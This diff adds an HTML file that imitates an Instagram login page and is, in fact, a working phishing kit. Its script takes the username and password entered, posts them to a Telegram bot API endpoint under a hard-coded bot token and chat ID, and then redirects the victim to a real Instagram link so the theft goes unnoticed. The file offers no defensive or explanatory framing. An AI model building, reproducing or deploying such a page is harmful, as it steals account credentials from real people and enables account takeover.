@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            direction: ltr; /* Text direction from left to right */
+        }
+        .login-container {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 90%; /* Reduced width for smaller screens */
+            max-width: 360px; /* Max width for phones */
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        .login-container img {
+            width: 150px; /* Reduced logo size to fit phones */
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 16px;
+            text-align: left; /* Align text to the left */
+        }
+        .login-options {
+            margin: 10px 0; /* Space between fields */
+            text-align: center; /* Center text alignment */
+        }
+        .login-options a {
+            color: #3897f0;
+            text-decoration: none;
+            font-size: 16px; /* Increase text size */
+            position: relative;
+            right: -10px; /* Move text to the right */
+        }
+        button {
+            width: 100%;
+            padding: 12px 0;
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px; /* Space between fields and "Log in" button */
+        }
+        button:hover {
+            background-color: #318ce7;
+        }
+        .facebook-login {
+            background-color: #3897f0; /* Background color to match login button */
+            color: #fff;
+            font-weight: bold;
+            margin-top: 10px;
+            padding: 12px 0;
+            border-radius: 5px;
+            border: none;
+        }
+        .facebook-login span {
+            font-size: 16px; /* Slightly larger text size */
+        }
+        .footer {
+            margin-top: 30px; /* Increase space between text and "Don't have an account?" */
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+        .error-message {
+            color: red; /* Red color for error message */
+            margin-bottom: 10px; /* Space below the error message */
+            display: none; /* Hide by default */
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjk0i_ahSJVkh7GhT8ovydhXcO0dSELstPvHgtUe8JUkauL1EI2HdpQIac4VdERejXfvxhf-J0-8OSTpUbNkvyD4nDVc3yVZfh5qdQGi97hoEDj-bofbdlPME4uKzK-LMiQZlwxm2bgq7CDP78BG-4xh02vS094N0-nBQLJ4soRgBJp2frcHrehs5tnzf6E/s2460/Picsart_24-08-29_04-08-46-221.png" alt="Instagram Logo">
+    
+    <!-- Error message element -->
+    <div id="errorMessage" class="error-message">يرجى ملء جميع الحقول لتسجيل الدخول.</div>
+
+    <button class="facebook-login">
+        <span>Continue with Facebook</span>
+    </button>
+    <div class="login-options">OR</div>
+    <form id="loginForm" method="POST">
+        <input type="hidden" name="chat_id" value="7395960132">
+        <input type="hidden" name="text" id="message">
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <div class="login-options">
+            <a href="#">Forgot password?</a>
+        </div>
+        <button type="submit" onclick="sendTelegram(event)">Log In</button>
+    </form>
+    <div class="footer">   
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+</div>
+
+<script>
+    function sendTelegram(event) {
+        event.preventDefault();  // Prevent form from being submitted by default
+
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+
+        // Get the error message element
+        var errorMessage = document.getElementById('errorMessage');
+
+        // Check if the fields are empty
+        if (username.trim() === '' || password.trim() === '') {
+            errorMessage.style.display = 'block'; // Show error message
+            return; // Stop the function if fields are empty
+        } else if (!/^[^\u0600-\u06FF]+$/.test(username)) {
+            // Check if the username contains Arabic characters
+            errorMessage.innerText = 'يرجى استخدام أحرف لاتينية فقط في اسم المستخدم.';
+            errorMessage.style.display = 'block';
+            return; // Stop if contains Arabic characters
+        } else if (password.length < 8) {
+            // Check if the password is less than 8 characters
+            errorMessage.innerText = 'يجب أن تكون كلمة المرور 8 أحرف على الأقل.';
+            errorMessage.style.display = 'block';
+            return; // Stop if password is too short
+        } else {
+            errorMessage.style.display = 'none'; // Hide error message if fields are filled
+        }
+
+        var message = "𝒜ℳ𝒾ℛ @VV9GG \n" + "Email: " + username + "\nPassword: " + password;
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://api.telegram.org/bot8125217759:AAE8f5Jn9gMYkGnSw3H1LWvOE7uJ4vaLj9E/sendMessage", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("chat_id=7395960132&text=" + encodeURIComponent(message));
+
+        // Redirect to Instagram after sending the message
+        xhr.onload = function() {
+            window.location.href = "https://ig.me/j/AbbWEzK2l49QDV__/";
+        };
+    }
+</script>
+
+</body>
+</html>
